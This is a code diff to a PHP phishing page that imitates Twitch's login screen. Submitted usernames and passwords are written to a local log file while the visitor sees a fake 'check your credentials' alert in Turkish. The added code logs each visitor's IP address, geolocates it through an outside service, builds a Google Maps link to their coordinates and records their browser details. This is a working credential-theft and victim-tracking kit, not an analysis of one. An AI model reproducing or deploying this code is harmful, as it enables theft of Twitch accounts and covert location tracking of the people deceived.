@@ -1,15 +1,76 @@
 <?php  
-
+date_default_timezone_set('Europe/Istanbul');
 if (isset($_POST['login']) && isset($_POST['password'])) {
 
 $ac = fopen("kayit.txt","a+");
 $username = $_POST['login'];
 $password = $_POST['password'];
-$userlar = ("\n __________________ \nUsername: ".$username."\nPassword: ".$password."\n__________________ \n");
+$userlar = ("\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
 fwrite($ac,$userlar);
 fclose($ac);
 echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
 }
+
+else{
+
+function GetIP(){
+ if(getenv("HTTP_CLIENT_IP")) {
+ $ip = getenv("HTTP_CLIENT_IP");
+ } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
+ $ip = getenv("HTTP_X_FORWARDED_FOR");
+ if (strstr($ip, ',')) {
+ $tmp = explode (',', $ip);
+ $ip = trim($tmp[0]);
+ }
+ } else {
+ $ip = getenv("REMOTE_ADDR");
+ }
+ return $ip;
+}
+
+$ip = GetIP();
+
+
+$tarih =" Tarih : ".date('d/m/Y  H:i');
+
+$Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 
+$adress = $Geo_Plugin_XML->geoplugin_request; 
+$ulke = $Geo_Plugin_XML->geoplugin_countryName;
+$bolge = $Geo_Plugin_XML->geoplugin_region;
+$kita = $Geo_Plugin_XML->geoplugin_continentCode;
+$ulkekodu = $Geo_Plugin_XML->geoplugin_countryCode;
+$sehir = $Geo_Plugin_XML->geoplugin_city;
+$plaka = $Geo_Plugin_XML->geoplugin_regionCode;
+$enlem = $Geo_Plugin_XML->geoplugin_latitude;
+$boylam = $Geo_Plugin_XML->geoplugin_longitude;
+$tarayici = $_SERVER['HTTP_USER_AGENT']; 
+
+$maps = "https://www.google.com/maps/place/".$enlem.",".$boylam."/@".$enlem.",".$boylam.",16z";
+$yamanefkar["0"] = " Ip Adresi : ".$adress;
+$yamanefkar["1"] = " Ulke : ".$ulke; 
+$yamanefkar["2"] = " Bolge : ".$bolge;
+$yamanefkar["3"] = " Kita : ".$kita;
+$yamanefkar["4"] = " Ulke Kodu : ".$ulkekodu;
+$yamanefkar["5"] = " Sehir : ".$sehir;
+$yamanefkar["6"] = " Plaka : ".$plaka;
+$yamanefkar["7"] = " Enlem : ".$enlem;
+$yamanefkar["8"] = " Boylam : ".$boylam;
+$yamanefkar["9"] = " Google Maps : ".$maps;
+$yamanefkar["10"] = " Tarayıcı : ".$tarayici; 
+
+
+$ac = fopen("kayit.txt","a+");
+
+$userlar = ("\n __________________ \n".$tarih."\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n!--VERİLER--!\n");
+fwrite($ac,$userlar);
+fclose($ac);
+sleep(2);
+
+
+
+
+}
+
  ?>
 
 <html class="tw-root--hover" data-whatinput="mouse" data-whatintent="mouse"><head><meta charset="utf-8"><title>Twitch</title><meta property="og:site_name" content="Twitch"><meta property="fb:app_id" content="161273083968709"><meta property="twitter:site" content="@twitch"><meta property="og:title" content="Twitch"><meta property="og:description" content="Twitch is the world's leading video platform and community for gamers."><meta property="og:image" content="//www-cdn.jtvnw.net/images/twitch_logo3.jpg"><meta property="og:url" content="https://www.twitch.tv/"><meta property="og:type" content="website"><link rel="canonical" href="https://www.twitch.tv"><link rel="alternate" href="https://m.twitch.tv/"><meta name="description" content="Twitch is the world’s leading live streaming platform for gamers and the things we love. Watch and chat now with millions of other fans from around the world"><link rel="icon" href="https://static.twitchcdn.net/assets/favicon-75270f9df2b07174c23c.ico"><link rel="dns-prefetch" href="https://api.twitch.tv/"><link rel="dns-prefetch" href="https://passport.twitch.tv/"><link rel="dns-prefetch" href="https://static-cdn.jtvnw.net/"><link rel="preconnect" href="https://api.twitch.tv/"><link rel="preconnect" href="https://static-cdn.jtvnw.net/"><link rel="dns-prefetch" href="https://gql.twitch.tv/">
